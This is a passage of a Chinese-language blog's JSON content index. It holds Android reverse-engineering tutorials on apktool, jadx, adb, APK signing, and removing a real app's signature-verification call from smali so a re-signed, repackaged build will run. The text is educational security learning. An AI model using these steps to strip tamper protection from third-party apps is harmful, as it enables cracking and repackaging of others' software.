20这两题都很类似，先看网页源代码。src的值使用双引号括起来的，如果想要成功执行js代码肯定需要去闭合标签，但是此处会用htmlspecialchars()函数进行处理，所以无法成功闭合,这就涉及一种xss攻击手段叫做flash xss,具体以后再研究","categories":[],"tags":[{"name":"靶场","slug":"靶场","permalink":"http://yejuns.github.io/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Android逆向第三课","slug":"Android逆向第三课","date":"2018-11-04T11:01:51.000Z","updated":"2021-07-24T12:59:33.540Z","comments":true,"path":"2018/11/04/Android逆向第三课/","link":"","permalink":"http://yejuns.github.io/2018/11/04/Android%E9%80%86%E5%90%91%E7%AC%AC%E4%B8%89%E8%AF%BE/","excerpt":"","text":"练习签名1、前期测试我们可以网络上找一些比较简单的APK，我这里随便找了个，命名为test.apk 我们首先测试APK是否可以正常安装，将APK拖入夜神模拟器中，发现可以正常安装运行。 然后使用apktool反编译APK，apktool d test.apk 反编译结束后，我们将反编译得到的文件重新打包，生成新的apk文件，apktool b test/ 会在当前目录下生成一个dist文件夹，文件夹下有新打包好的apk文件。这个新打包的apk由于没有签名，所有还不能正常安装，我们需要加上签名。 123456# 生成证书，会在当前目录下生成一个 keystore 文件keytool -genkey -keystore my-release-key.keystore -alias my_alias -keyalg RSA -keysize 4096 -validity 10000# 地区、公司可以随便填，口令后面还会用到# 签名jarsigner -sigalg MD5withRSA -digestalg SHA1 -keystore my-release-key.keystore -signedjar test_sign.apk test.apk my_alias 由于这里的签名是我们伪造的，所有无法安装成功后无法正常启动。如果想要运行成功，我们就需要绕过签名 2、使用jadx查看代码由于我们是在运行一段时间后退出了app，所以我们可以猜测是在 Application 阶段进行了检验。直接查找 AndroidManifist.xml 文件，找到其中 Application 所对应的Activity。 1android:name=&quot;android.taobao.atlas.startup.AtlasBridgeApplication&quot; 这里无法从 Application 中确定的Activity，所以我们只能通过全局查找来寻找关键方法。 进行这个方法，虽然jadx得到的代码进行了混淆，但是我们仍然可以根据一些名字见名知义，比如check,verify,password,如果看到这些单词，就要注意一些。 在代码中，我们可以发现有一个名为checkSingAsync()的方法，那么这个方法很有可能就是进行签名校验的方法。我们右击该方法，跳到声明，可以看到详细的内容。 那现在我们只需要注释掉checkSingAsync()，那么就可以绕过签名的检验。我们使用apktool得到smali文件，进行修改。 由于源代码中，ShuqiApplication 位于 com.shuqi.app. ShuqiApplication package中，所以对应的samli文件也在目录 smali\\com\\shuqi\\app 下。checkSingAsync() 位于第138行，因此我们在smali文件中也找到对应的138行， 12345invoke-virtual &#123;p0&#125;, Lcom/shuqi/app/ShuqiApplication;-&gt;getApplication()Landroid/app/Application;move-result-object v0invoke-static &#123;v0&#125;, Lcom/shuqi/app/ShuqiApplication;-&gt;checkSigAsync(Landroid/content/Context;)V 原来的一行代码 checkSigAsync(getApplication()) 为什么会变成3行的 smali 代码 ？ 可以这么理解，首先执行 getApplication() 方法，然后将结果返回（move-result），最后执行 checkSigAsync 如果看不懂smali文件也没有关系，我们可以简单粗暴一点，直接将上面的代码删除，然后重新打包。(每次打包都需要删除原项目中的 build、dist文件夹，不然会打包失败) 最后就可以正常运行了。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"http://yejuns.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"Android逆向第二课 - 常用概念","slug":"Android逆向第二课","date":"2018-10-21T11:01:51.000Z","updated":"2021-07-24T12:59:24.367Z","comments":true,"path":"2018/10/21/Android逆向第二课/","link":"","permalink":"http://yejuns.github.io/2018/10/21/Android%E9%80%86%E5%90%91%E7%AC%AC%E4%BA%8C%E8%AF%BE/","excerpt":"","text":"7、adb命令的使用ADB全称为AndroidDebugBridge(android 调试桥),是一种功能多样的命令行工具,它是一种客户端-服务器程序，包括以下三个组件： 客户端：用于发送命令。客户端在开发计算机上运行。可以通过发出 adb 命令从命令行终端调用客户端 守护程序 (adbd)：用于在设备上运行命令。守护程序在每个设备上作为后台进程运行。 服务器：用于管理客户端与守护程序之间的通信。服务器在开发机器上作为后台进程运行。 常用命令 安卓设备列表 adb devices adb devices 显示device unauthorized adb kill-server adb start-server 进入安卓shell adb shell 安卓日志 adb logcat adb logcat -s keyword 把文件推送进安卓设备 adb push 安装APK adb install XXX.apk adb uninstall packagename 8、APK启动加载Dex加载流程 Java层Dex加载流程： BootClassLoader —&gt; PathClassLoader —-&gt; DexClassLoader（hook就发生在这一步） Native层Dex加载流程（dex文件的解析最后还是会到native层） dalvik 通过libdvm.so打开 dex文件 （重编译 system.img） libdvm.so中有很重要的一步就是OpenDexFileNative，会去做很多解析和加载（因此有人会在这一步也进行hook） App的加载流程 每个Apk运行时都需要有一个Application对象 Application对象执行onCreate方法时 APP就开始运行.(Application定义在AndroidManifest.xml文件中) 9、APP四大组件 Activity一个Activity通常就是一个界面 123456&lt;activity android:name=&quot;&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt; &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt; &lt;/intent-filter&gt;&lt;/activity&gt; service 后台服务，播放音乐，数据处理等 Broadcase receiver 异步接收广播 Content provider： 内容提供者 10、APK包加固为了防止APK被恶意地反编译，app在打包发布的时候都会对apk进行加固。常见加固方式有： 代码层级加密-代码混淆 代码混淆的本质是把工程中原来的有具体含义的类名、变量名、方法名，修改成让人看不懂的名字 Dex文件加密 dex是Android工程中的代码资源文件，通过dex可以反编译出java代码。dex的加壳就是通过对dex文件加密拼接加壳。apk工程在安装成功后，app启动时会有dex解密的过程，然后重新加载解密后的dex文件。 逆向/脱壳方法 反编译 Hook：取得要Hook函数/方法的控制权，不会破坏程序 动态调试：反调试，汇编，计算内存地址","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"http://yejuns.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"Android逆向第一课 一 基础知识","slug":"Android逆向第一课","date":"2018-06-21T11:01:51.000Z","updated":"2021-07-24T12:58:40.880Z","comments":true,"path":"2018/06/21/Android逆向第一课/","link":"","permalink":"http://yejuns.github.io/2018/06/21/Android%E9%80%86%E5%90%91%E7%AC%AC%E4%B8%80%E8%AF%BE/","excerpt":"","text":"最近自己在学习Android的逆向，把学习的过程记录一下，方便新手入门 1、预备工具JAVA环境： 官方下载安装地址: https://www.oracle.com/technetwork/java/javase/downloads/index.html （现在android开发还是用Java比较多，虽然google在推广Kotlin） apktool： https://ibotpeaches.github.io/Apktool/ 是apktool.jar 要安装Java环境才能运行 JADX： https://www.softpedia.com/get/Programming/Other-Programming-Files/Jadx.shtml .exe文件，目录里可以直接双击运行 Java SDK自带：keytool（证书工具）、jarsigner（签名工具） 2、基础知识JAVA源代码文件是XXX.java,JAVA是编译性语言，编译后才能运行，编译后的文件是XXX.class （class文件是可执行文件，jar包里就是.class文件），JAVA虚拟机运行的就是XXX.class文件 安卓虚拟机下面是运行的是xxx.dex，dex是安卓里可执行文件（.dex文件是安卓环境下运行的可执行文件） .smali文件是将.dex文件反编译得到的文件，具有特定的语法格式（因为android系统使用自己的dalvik虚拟机，代码最终编译后生成的是.dex文件） Android程序的安装包是一个APK文件，APK是一个压缩文件，用zip压缩解压，解压后的主要文件有： assets：资源文件(图片，网页，视频)，不会被编译。 res：资源文件（静态文本，图片，关键资源） 会被编译。 lib：.so库，系统库，自己打包的库。有的把加密/token生成方式放在.so文件里 META-INF：签名信息。 AndroidManifest.xml：配置信息（关键），举例修改权限；同时定义了一些程序入口 classes.dex：android dalvik虚拟机可执行文件 resources.arsc：资源索引/对应文件 3、apktool使用apktool d test.apk 反编译test.apk包（d: decode） apktool b test 将反编译后的文件重新打包(b:build) 使用zip对APK解压后，会发现各个文件是乱码，无法去读 使用apktool反编译后，才可以去正常地读取信息 使用apktool反编译后，我们就可以得到关于应用的.smali文件,对smali文件进行修改，然后就可以重新打包成新的应用。 关于class、dex、smali文件之间的转换，可以看下图 为什么不将整个应用之间完全反编译为java文件，这样可读性更好？因为我们并不知道APP在编译时的java版本、各种环境，直接将修改反编译后的class文件，很容易出现重新构建的APP无法运行的情况。因此对编译后的smali文件进行修改后，打包后就可以直接运行。 4、jadx使用jadx是一款反编译利器，同时支持命令行和图形界面，能以最简便的方式完成apk的反编译操作, 实现 .dex -&gt; .java 双击jadx-gui就可以打开图形界面，选择一个APK打开，很快就会解析出相应的结果 jadx提供了强大的搜索功能，通过Navigation -&gt; Text Search进行搜索，jadx的搜索，支持四种维度，Class、Method、Field、Code，我们可以根据我们搜索的内容进行勾选，范围最大的就是 Code ，基本上就是文本匹配搜索。 jadx还提供了改名（deobfuscation）的功能，这样可以方便我们进行搜索 jadx-gui 虽然可以直接阅读代码，但是毕竟没有我们常见的编辑器来的方便。我们可以将反编译后的项目直接导出成一个 Gradle 编译的工程（File -&gt; Save as gradle project），然后用Android studio打开这个项目，方便代码的阅读。 5、签名签名的作用是 - 确保Apk来源的真实性，确保Apk没有被第三方篡改。相当于在Apk中写入一个“指纹”。指纹写入以后，Apk中有任何修改，都会导致这个指纹无效，Android系统在安装Apk进行签名校验时就会不通过，从而保证了安全性。 未签名APK不能在安卓手机上安装 签名的过程： 通过Hash算法提取出原始数据的摘要； 通过基于密钥（私钥）的非对称加密算法对提取出的摘要进行加密，加密后的数据就是签名信息； 将签名信息写入原始数据的签名区块内; Android提供了两种对Apk的签名方式，一种是基于JAR的签名方式，另一种是基于Apk的签名方式，它们的主要区别在于使用的签名文件不一样：jarsigner使用keystore文件进行签名；apksigner除了支持使用keystore文件进行签名外，还支持直接指定pem证书文件和私钥进行签名。 keytool jarsigner 是JAVA JDK自带的 1234# 生成证书keytool -genkey -keystore my-release-key.keystore -alias my_alias -keyalg RSA -keysize 4096 -validity 10000# 用证书给apk签名jarsigner -sigalg MD5withRSA -digestalg SHA1 -keystore my-release-key.keystore -signedjar com.dahuodong.veryevent_4.6.2_60_sign.apk com.dahuodong.veryevent_4.6.2_60.apk my_alias","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"http://yejuns.github.io/tags/Android%E9%80%86%E5%90%91/"}]}],"categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"},{"name":"计算机网络","slug":"计算机网络","permalink":"http://yejuns.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"爬虫","slug":"爬虫","permalink":"http://yejuns.github.io/tags/%E7%88%AC%E8%99%AB/"},{"name":"算法","slug":"算法","permalink":"http://yejuns.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"计算机基础","slug":"计算机基础","permalink":"http://yejuns.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"},{"name":"工具","slug":"工具","permalink":"http://yejuns.github.io/tags/%E5%B7%A5%E5%85%B7/"},{"name":"渗透","slug":"渗透","permalink":"http://yejuns.github.io/tags/%E6%B8%97%E9%80%8F/"},{"name":"信息收集","slug":"信息收集","permalink":"http://yejuns.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"Linux安全","slug":"Linux安全","permalink":"http://yejuns.github.io/tags/Linux%E5%AE%89%E5%85%A8/"},{"name":"测试","slug":"测试","permalink":"http://yejuns.github.io/tags/%E6%B5%8B%E8%AF%95/"},{"name":"javaScript","slug":"javaScript","permalink":"http://yejuns.github.io/tags/javaScript/"},{"name":"靶场","slug":"靶场","permalink":"http://yejuns.github.io/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"linux","slug":"linux","permalink":"http://yejuns.github.io/tags/linux/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://yejuns.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"windows","slug":"windows","permalink":"http://yejuns.github.io/tags/windows/"},{"name":"SqlMap","slug":"SqlMap","permalink":"http://yejuns.github.io/tags/SqlMap/"},{"name":"Android逆向","slug":"Android逆向","permalink":"http://yejuns.github.io/tags/Android%E9%80%86%E5%90%91/"},{"name":"hexo使用","slug":"hexo使用","permalink":"http://yejuns.github.io/tags/hexo%E4%BD%BF%E7%94%A8/"},{"name":"数据库","slug":"数据库","permalink":"http://yejuns.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]}